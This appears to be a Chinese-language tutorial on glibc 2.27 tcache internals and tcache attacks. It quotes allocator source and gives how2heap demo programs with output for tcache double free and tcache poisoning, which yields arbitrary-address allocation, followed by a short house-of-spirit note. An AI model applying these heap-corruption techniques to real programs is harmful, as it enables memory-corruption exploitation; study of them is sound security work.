
# Tcache 分析

## Unsorted Bin 遍历

```
int iters = 0;
while ((victim = unsorted\_chunks (av)->bk) != unsorted\_chunks (av))
{
....................
....................
....................
/\* remove from unsorted list \*/
unsorted\_chunks (av)->bk = bck;
bck->fd = unsorted\_chunks (av);
// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache
#if USE\_TCACHE
// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历
We may return one of these chunks later. \*/
if (tcache\_nb
&& tcache->counts[tc\_idx] < mp\_.tcache\_count)
{
tcache\_put (victim, tc\_idx);
return\_cached = 1;
continue;
}
else
{
#endif
check\_malloced\_chunk (av, victim, nb);
void \*p = chunk2mem (victim);
alloc\_perturb (p, bytes);
return p;
#if USE\_TCACHE
}
#endif
}
//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。
.......................................
.......................................
.......................................
#if USE\_TCACHE
//如果有 大小适配的 unsorted bin 进入了 tcache(return\_cached=1) 同时 mp\_.tcache\_unsorted\_limit > 0 默认为 0 ，不会进入分支, 继续遍历
++tcache\_unsorted\_count;
if (return\_cached
&& mp\_.tcache\_unsorted\_limit > 0
&& tcache\_unsorted\_count > mp\_.tcache\_unsorted\_limit)
{
return tcache\_get (tc\_idx);
}
#endif
.......................................
.......................................
.......................................
} // end of while ((victim = unsorted\_chunks (av)->b
//遍历完 unsorted bin 后 ，根据 return\_cached 判断 tcache 里面是否有合适的 chunk
#if USE\_TCACHE
/\* If all the small chunks we found ended up cached, return one now. \*/
if (return\_cached)
{
return tcache\_get (tc\_idx);
}
#endif
```

在遍历 `unsorted bin` 的时候,如果有大小适配的 `chunk`,不会立刻返回,而是将这个 `chunk` 加入 `Tcache`,并且设置 `return_cached = 1`,表示 `Tcache` 此时已经有了符合大小的 `chunk`.如果大小不是正好适配,那么就把 `chunk` 放到相应的 `bin` 里面.
遍历完 `unsorted bin` 之后,根据 `return_cached` 的值来判断 `Tcache` 里面是否有符合大小的 `chunk`,如果有的话直接调用 `tcache_get(tc_idx)` 并返回获得的 `chunk`.如果没有的话则继续使用 `large bin` 或者 `top chunk` 来分配.

## 内存释放

```
static void
\_int\_free (mstate av, mchunkptr p, int have\_lock)
{
......
size = chunksize (p);
check\_inuse\_chunk(av, p);
#if USE\_TCACHE
{
size\_t tc\_idx = csize2tidx (size);
if (tcache
&& tc\_idx < mp\_.tcache\_bins
&& tcache->counts[tc\_idx] < mp\_.tcache\_count)
{
tcache\_put (p, tc\_idx);
return;
}
}
#endif
```

首先获取要释放的 `chunk` 的 `size`,然后判断 `size` 是否符合规范,如果符合的话就看 `tcache->counts[tc_idx]` 有没有满,没满的话就直接放入 `Tcache`,然后返回,
如果上述条件没有成立的话,就按照常规方法来释放 `chunk`.

## 小结

`Tcache` 有 64 个 `bin` 数组,所以在 64 位的情况下,`Tcache` 可以接受 0×20~0×410 大小的 `chunk`.当我们分配这个范围内的 `chunk` 时,不会直接进入 `bin`,而是在 `Tcache` 中分配内存,释放的时候也是同理,但是 `Tcache` 自身基本没什么检测,所以我们可以轻易实现好多在 `bin` 中很难进行的操作.

# Tcache Attack

实验环境: `Glibc 2.27`
示例文件: `how2heap` (https://github.com/shellphish/how2heap)

### Tcache_dup

`Tcache` 在 `free` 的时候并不会修改 `in_use` 位,所以我们可以连续释放同一个 `chunk` 来造成 `Double free`,这个比 `fast bin` 还不安全.

```
#include <stdio.h>
#include <stdlib.h>
int main()
{
fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
fprintf(stderr, "Allocating buffer.\n");
int \*a = malloc(8);
fprintf(stderr, "malloc(8): %p\n", a);
fprintf(stderr, "Freeing twice...\n");
free(a);
free(a);
fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
return 0;
}
```

运行结果为:
```
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x7fffd4adb260
Freeing twice...
Now the free list has [ 0x7fffd4adb260, 0x7fffd4adb260 ].
Next allocated buffers will be same: [ 0x7fffd4adb260, 0x7fffd4adb260 ].
```

### Tcache poisoning

这个其实挺恐怖的,只要修改空闲 `Tcache` 的 `next` 指针,直接就能分配任意地址了.

```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
int main()
{
// disable buffering
setbuf(stdin, NULL);
setbuf(stdout, NULL);
printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
"returning a pointer to an arbitrary location (in this case, the stack).\n"
"The attack is very similar to fastbin corruption attack.\n");
printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
"We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");
size\_t stack\_var;
printf("The address we want malloc() to return is %p.\n", (char \*)&stack\_var);
printf("Allocating 2 buffers.\n");
intptr\_t \*a = malloc(128);
printf("malloc(128): %p\n", a);
intptr\_t \*b = malloc(128);
printf("malloc(128): %p\n", b);
printf("Freeing the buffers...\n");
free(a);
free(b);
printf("Now the tcache list has [ %p -> %p ].\n", b, a);
printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
"to point to the location to control (%p).\n", sizeof(intptr\_t), b, &stack\_var);
b[0] = (intptr\_t)&stack\_var;
printf("Now the tcache list has [ %p -> %p ].\n", b, &stack\_var);
printf("1st malloc(128): %p\n", malloc(128));
printf("Now the tcache list has [ %p ].\n", &stack\_var);
intptr\_t \*c = malloc(128);
printf("2nd malloc(128): %p\n", c);
printf("We got the control\n");
return 0;
}
```

运行结果为:
```
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.
After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,
We have to create and free one more chunk for padding before fd pointer hijacking.
The address we want malloc() to return is 0x7fffff905088.
Allocating 2 buffers.
malloc(128): 0x7ffff76b0260
malloc(128): 0x7ffff76b02f0
Freeing the buffers...
Now the tcache list has [ 0x7ffff76b02f0 -> 0x7ffff76b0260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x7ffff76b02f0
to point to the location to control (0x7fffff905088).
Now the tcache list has [ 0x7ffff76b02f0 -> 0x7fffff905088 ].
1st malloc(128): 0x7ffff76b02f0
Now the tcache list has [ 0x7fffff905088 ].
2nd malloc(128): 0x7fffff905088
We got the control
```

可以回顾一下 `tcache_get` 函数,拿 `chunk` 出来的时候并不检查地址是否合法,`malloc` 分配的时候,也只是简单的判断了一下 `tcache->entries[tc_idx]` 是否为空.所以就造成了任意地址分配

### tcache_house_of_spirit

比以前的 `house of spirit` 更简单了,只需伪造一个 `size` 区域,然后将伪造的 `fake chunk` 释放,再次 `malloc` 相应大小就可以得到 `fake_chunk`.
